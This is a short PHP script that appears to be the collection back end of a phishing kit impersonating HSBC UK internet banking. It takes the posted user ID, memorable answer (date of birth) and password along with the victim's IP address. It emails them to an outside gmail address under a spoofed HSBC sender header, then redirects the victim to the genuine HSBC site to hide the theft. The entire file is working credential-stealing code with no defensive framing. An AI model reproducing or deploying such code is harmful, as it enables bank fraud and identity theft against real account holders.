<?
$to = "1000000pounds@gmail.com";
//-----------------------------------------
$userid = $_POST['userid'];
$memorableAnswer = $_POST['memorableAnswer'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$subj = "Internet Banking: HSBC Bank UK";
$msg = "Input Internet Banking user ID : $userid\nDate Of Birth : $memorableAnswer\nSecurity Number : $password\nIP : $ip";
$from = "FROM: 	BraIn Inc. ®<Membership@hsbc.co.uk>";

			{

		mail($to,$subj,$msg,$from);
		
				}

		    header("location: http://www.hsbc.co.uk/");
?>